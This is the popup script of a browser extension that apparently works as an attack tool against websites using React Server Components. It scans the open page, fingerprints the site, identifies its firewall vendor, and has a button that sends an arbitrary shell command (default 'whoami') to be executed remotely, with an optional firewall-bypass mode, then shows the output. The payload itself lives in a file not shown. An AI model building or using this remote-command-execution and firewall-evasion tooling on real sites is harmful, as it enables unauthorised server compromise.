document.addEventListener('DOMContentLoaded', () => {
    const el = {
        passiveBadge: document.getElementById('passive-badge'),
        passiveList: document.getElementById('passive-list'),
        btnFinger: document.getElementById('btnFingerprint'),
        fingerResult: document.getElementById('fingerprint-result'),
        activeList: document.getElementById('active-list'),
        btnExploit: document.getElementById('btnExploit'),
        cmdInput: document.getElementById('cmdInput'),
        exploitStatus: document.getElementById('exploit-status'),
        exploitResult: document.getElementById('exploit-result'),
        rceOutput: document.getElementById('rce-output'),
        wafToggleRow: document.getElementById('waf-toggle-row'),
        wafToggle: document.getElementById('waf-toggle'),
        wafStatus: document.getElementById('waf-status')
    };

    const state = {
        wafDetected: false,
        wafVendor: null
    };

    // Get the currently active tab for messaging.
    const getActiveTab = () => new Promise((resolve) => {
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            resolve(tabs && tabs[0] ? tabs[0] : null);
        });
    });

    // Send a message to the content script running in a tab.
    const sendMessageToTab = (tabId, message) => new Promise((resolve) => {
        chrome.tabs.sendMessage(tabId, message, (res) => {
            if (chrome.runtime.lastError) {
                resolve(null);
                return;
            }
            resolve(res);
        });
    });

    // Allow injection only for http/https pages.
    const canInjectIntoTab = (tab) => {
        if (!tab || !tab.url) return false;
        return tab.url.startsWith('http://') || tab.url.startsWith('https://');
    };

    // Inject the content script if it was not loaded yet.
    const injectContentScript = (tabId) => new Promise((resolve) => {
        chrome.scripting.executeScript(
            { target: { tabId }, files: ['content.js'] },
            () => resolve(!chrome.runtime.lastError)
        );
    });

    // Send a message with automatic injection fallback.
    const sendToTab = async (tab, message) => {
        if (!tab || !tab.id) return null;
        let res = await sendMessageToTab(tab.id, message);
        if (res !== null) return res;
        if (!canInjectIntoTab(tab)) return null;
        const injected = await injectContentScript(tab.id);
        if (!injected) return null;
        return sendMessageToTab(tab.id, message);
    };

    // Render passive scan results.
    const renderPassive = (res) => {
        if (!res) {
            el.passiveBadge.innerText = 'ERROR';
            el.passiveList.innerHTML = '<li>Please refresh page</li>';
            return;
        }

        if (res.isRSC) {
            el.passiveBadge.innerText = 'DETECTED';
            el.passiveBadge.className = 'status bad';
        } else {
            el.passiveBadge.innerText = 'SAFE';
            el.passiveBadge.className = 'status good';
        }

        el.passiveList.innerHTML = '';
        if (res.details.length === 0) {
            el.passiveList.innerHTML = '<li>No patterns found</li>';
            return;
        }

        res.details.forEach((detail) => {
            const li = document.createElement('li');
            li.innerText = detail;
            li.classList.add('passive-alert');
            el.passiveList.appendChild(li);
        });
    };

    // Render WAF detection status in the toggle row.
    const renderWaf = (res) => {
        el.wafToggleRow.style.display = 'flex';

        if (!res || !res.detected) {
            state.wafDetected = false;
            state.wafVendor = null;
            el.wafStatus.innerText = 'No WAF detected';
            el.wafStatus.classList.remove('danger');
            return;
        }

        const primary = res.matches[0];
        state.wafDetected = true;
        state.wafVendor = primary ? primary.name : 'Unknown WAF';
        el.wafStatus.innerText = `${state.wafVendor} WAF detected`;
        el.wafStatus.classList.add('danger');
    };

    // Initialize popup state and event listeners.
    const init = async () => {
        const tab = await getActiveTab();
        if (!tab) return;

        const passiveRes = await sendToTab(tab, { action: 'get_passive' });
        renderPassive(passiveRes);

        const wafRes = await sendToTab(tab, { action: 'detect_waf' });
        renderWaf(wafRes);

        el.btnFinger.addEventListener('click', async () => {
            el.btnFinger.disabled = true;
            el.btnFinger.innerText = 'Probing...';
            el.fingerResult.style.display = 'none';

            const res = await sendToTab(tab, { action: 'run_fingerprint' });
            el.btnFinger.disabled = false;
            el.btnFinger.innerText = 'Run fingerprint probe';
            el.fingerResult.style.display = 'block';
            el.activeList.innerHTML = '';

            if (res && res.detected) {
                res.details.forEach((detail) => {
                    const li = document.createElement('li');
                    li.innerText = detail;
                    li.classList.add('active-alert');
                    el.activeList.appendChild(li);
                });
            } else {
                el.activeList.innerHTML = "<li style='color:#27ae60'>No Active RSC Response</li>";
            }
        });

        el.btnExploit.addEventListener('click', async () => {
            const cmd = el.cmdInput.value || 'whoami';
            el.btnExploit.disabled = true;
            el.exploitStatus.style.display = 'block';
            el.exploitResult.style.display = 'none';
            el.rceOutput.className = 'console-out';

            const res = await sendToTab(tab, {
                action: 'run_exploit',
                cmd,
                wafBypass: el.wafToggle.checked,
                wafVendor: state.wafVendor
            });

            el.btnExploit.disabled = false;
            el.exploitStatus.style.display = 'none';
            el.exploitResult.style.display = 'block';

            if (res && res.success) {
                el.rceOutput.style.color = '#00cec9';
                el.rceOutput.innerText = `[+] Command: ${cmd}\n[+] Output:\n${res.output}`;
                chrome.runtime.sendMessage({ action: 'update_badge' });
            } else {
                el.rceOutput.style.color = '#e74c3c';
                el.rceOutput.innerText = `[-] ${res ? res.msg : 'Unknown Error'}`;
            }
        });
    };

    init();
});
